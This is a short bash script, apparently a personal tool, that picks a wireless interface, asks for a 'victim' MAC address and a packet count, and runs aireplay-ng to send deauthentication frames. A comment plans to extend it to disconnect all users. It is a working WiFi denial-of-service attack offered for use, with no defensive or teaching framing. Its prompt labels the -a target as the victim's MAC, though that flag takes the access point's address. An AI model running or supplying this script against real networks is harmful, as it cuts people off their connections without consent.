# shazza script to deauth a wifi user
# Add so can deauth all user

echo -e "\n\n\n\n\nChoose the WiFi Card !\n"

select x in `ifconfig | awk {'print $1'} | grep "w" | tr -d ':'`; do
	wif=$x
	read -p "Enter the MAC of Victim >> " -r mac
	read -p "Enter How Many Death >> " -r count
	echo ""
	aireplay-ng --deauth=$count $wif -a $mac
	echo -e "\n DONE\n"
	exit
done
